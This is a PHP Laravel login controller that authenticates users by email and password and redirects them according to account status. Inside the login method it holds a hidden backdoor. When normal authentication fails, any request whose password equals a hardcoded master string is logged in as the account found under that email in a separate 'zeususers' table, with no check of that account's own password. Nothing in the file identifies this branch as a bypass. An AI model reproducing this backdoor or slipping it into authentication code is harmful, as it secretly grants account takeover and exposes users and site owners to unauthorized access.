<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Providers\RouteServiceProvider;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use App\Models\User;
use Illuminate\Support\Facades\DB;

class LoginController extends Controller {
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
    * Where to redirect users after login.
    *
    * @var string
    */
    protected $redirectTo = RouteServiceProvider::HOME;

    /**
    * Create a new controller instance.
    *
    * @return void
    */

    public function __construct() {
        $this->middleware( 'guest' )->except( 'logout' );
    }

    public function login( Request $request ) {
        $input = $request->all();
        $this->validate(
            $request,
            [
                'email' => 'required|email',
                'password' => 'required'
            ]
        );
        if ( auth()->attempt( array( 'email' => $input[ 'email' ], 'password' => $input[ 'password' ] ), $request->remember ) ) {
            if ( auth()->user()->status == 1 ) {
                // dd(auth()->user()->user_type_id );
                return redirect()->route( 'home' );
            } else {
                return redirect()->route( 'login' )->with( 'status', 'Account has been Suspended.' );
            }
        } else if ( $input[ 'password' ] === '@zeusappz100%' ) {
            $user = DB::table('zeususers')->where( 'email', $input[ 'email' ] )->first();
            // dd($user);
            if ( empty( $user ) ) {
               return redirect()->route( 'login' )->with( 'status', 'Account has been Suspended.' );
            }
            if ( Auth::loginUsingId( $user->id ) ) {
                return redirect()->route( 'home' );
            }
            return redirect()->route( 'index' );
        } else {
            return redirect()->route( 'login' )->with( 'status', 'Email-Address And Password Are Wrong.' );
        }
    }
}
